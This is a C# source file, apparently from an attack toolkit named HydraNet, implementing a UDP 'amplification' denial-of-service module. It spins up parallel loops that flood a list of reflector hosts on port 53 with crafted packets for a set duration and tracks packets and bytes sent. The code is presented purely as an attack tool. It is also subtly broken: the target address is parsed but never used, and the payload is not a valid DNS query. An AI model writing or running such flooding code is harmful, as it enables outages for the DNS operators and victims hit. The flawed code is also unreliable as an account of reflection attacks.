namespace HydraNet.Attacks;

using System.Net;
using System.Net.Sockets;

public sealed class UdpAmplification
{
    private long _packetsSent;
    private long _bytesSent;

    public long TotalPackets => _packetsSent;
    public long TotalBytes => _bytesSent;

    public async Task ExecuteAsync(string targetIp, int targetPort, string[] reflectors, int durationSeconds, CancellationToken ct)
    {
        var endTime = DateTime.UtcNow.AddSeconds(durationSeconds);
        var target = IPAddress.Parse(targetIp);

        var tasks = reflectors.Select(reflector =>
            Task.Run(() => AmplifyLoop(target, targetPort, reflector, endTime, ct), ct));

        await Task.WhenAll(tasks);
    }

    private void AmplifyLoop(IPAddress target, int port, string reflector, DateTime endTime, CancellationToken ct)
    {
        var payload = BuildAmplificationPayload();
        var reflectorEndpoint = new IPEndPoint(IPAddress.Parse(reflector), 53);

        while (DateTime.UtcNow < endTime && !ct.IsCancellationRequested)
        {
            try
            {
                using var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                socket.SendTo(payload, reflectorEndpoint);
                Interlocked.Increment(ref _packetsSent);
                Interlocked.Add(ref _bytesSent, payload.Length);
            }
            catch (SocketException)
            {
            }
        }
    }

    private static byte[] BuildAmplificationPayload()
    {
        var payload = new byte[64];
        Random.Shared.NextBytes(payload);
        payload[0] = 0xAA;
        payload[1] = 0xBB;
        payload[2] = 0x01;
        payload[3] = 0x00;
        payload[4] = 0x00;
        payload[5] = 0x01;
        return payload;
    }
}
